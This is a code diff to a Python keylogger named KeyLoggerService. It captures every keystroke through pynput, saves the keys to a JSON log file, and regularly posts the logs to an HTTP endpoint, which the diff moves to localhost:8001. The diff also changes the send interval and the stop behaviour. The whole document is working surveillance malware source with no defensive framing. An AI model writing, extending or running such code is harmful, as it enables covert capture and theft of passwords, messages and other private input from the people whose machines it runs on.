@@ -1,10 +1,9 @@
 import time
 import requests
 import threading
+import json
 from pynput import keyboard
 from pynput.keyboard import Key
-from cryptography.fernet import Fernet
-import os
 
 class KeyLoggerService:
     def __init__(self):
@@ -30,12 +29,9 @@ class KeyLoggerService:
 class FileWriter:
     @staticmethod
     def write_to_file(key_data):
-        with open("key_log.txt", 'a') as log_file:
-            for log_dict in key_data:
-                for timestamp in log_dict:
-                    for key in log_dict[timestamp]:
-                        content = f"{timestamp}\n{key}\n"
-                        log_file.write(content)
+        with open("log.json", 'a') as log_file:
+            json.dump(key_data, log_file, indent=2, ensure_ascii=False)
+            log_file.write("\n")
 
 class ServerSender:
     def __init__(self, server_url, service):
@@ -49,22 +45,24 @@ class ServerSender:
             if logs:
                 response = requests.post(self.server_url, json=logs)
                 print(f"Data sent to server. Response: {response.text}")
-            time.sleep(20)
+            time.sleep(36)
 
 class KeyLoggerManager:
     def __init__(self):
         self.service = KeyLoggerService()
         self.file_writer = FileWriter()
-        self.server_sender = ServerSender("http://localhost:8000/api/key_logs", self.service)
+        self.server_sender = ServerSender("http://localhost:8001/api/key_logs", self.service)
         self.listener = None
 
     def handle_key_press(self, key):
         self.service.add_key(key)
         if key == Key.space:
-            self.service.save_and_clear()
+            logs = self.service.save_and_clear()
+            self.file_writer.write_to_file(logs)
         elif key == Key.esc:
             logs = self.service.save_and_clear()
             self.file_writer.write_to_file(logs)
+            return False
 
     def start(self):
         with keyboard.Listener(on_release=self.handle_key_press) as listener:
